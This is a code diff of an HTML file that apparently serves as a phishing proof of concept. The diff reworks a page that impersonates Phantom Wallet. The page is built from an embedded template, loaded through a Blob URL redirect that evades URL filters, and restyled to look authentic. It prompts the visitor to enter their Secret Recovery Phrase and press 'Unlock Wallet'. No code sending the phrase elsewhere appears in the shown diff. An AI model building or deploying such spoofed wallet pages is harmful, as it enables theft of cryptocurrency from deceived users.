@@ -3,42 +3,68 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Redirect to Blob</title>
+  <title>Blob Phantom Spoof</title>
   <meta http-equiv="Content-Security-Policy" content="sandbox allow-scripts">
   <script>
-    const htmlContent = `
+    const html = `
       <!DOCTYPE html>
       <html lang="en">
       <head>
         <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Phishing Page</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+        <title>Phantom Wallet</title>
         <style>
           body {
-            background: white;
+            background: #0d0d0d;
+            color: white;
+            font-family: Arial, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
-            font-family: sans-serif;
-            color: #333;
+            margin: 0;
           }
           img {
-            width: 120px;
+            width: 100px;
             margin-bottom: 20px;
+            border-radius: 16px;
+          }
+          h2 {
+            margin: 10px 0;
+            font-size: 1.5em;
+          }
+          input {
+            width: 260px;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 6px;
+            font-size: 1em;
+          }
+          button {
+            padding: 10px 20px;
+            background-color: #8a63d2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 1em;
           }
         </style>
       </head>
       <body>
-        <img src="https://mintlify.s3.us-west-1.amazonaws.com/phantom-e50e2e68/resources/images/Phantom_SVG_Icon.svg" alt="Phantom Logo" />
-        <h2>Welcome to Phantom Wallet</h2>
-        <p>Please enter your seed phrase to continue.</p>
+        <img src="https://raw.githubusercontent.com/hellsing032/hellsing032.github.io/main/Phantom_SVG_Icon.svg" alt="Phantom Logo">
+        <h2>Welcome Back</h2>
+        <p>Enter your Secret Recovery Phrase</p>
+        <input placeholder="Secret Recovery Phrase" /><br/>
+        <button>Unlock Wallet</button>
       </body>
       </html>
     `;
 
-    const blob = new Blob([htmlContent], { type: 'text/html' });
+    const blob = new Blob([html], { type: 'text/html' });
     const blobURL = URL.createObjectURL(blob);
     location.href = blobURL;
   </script>
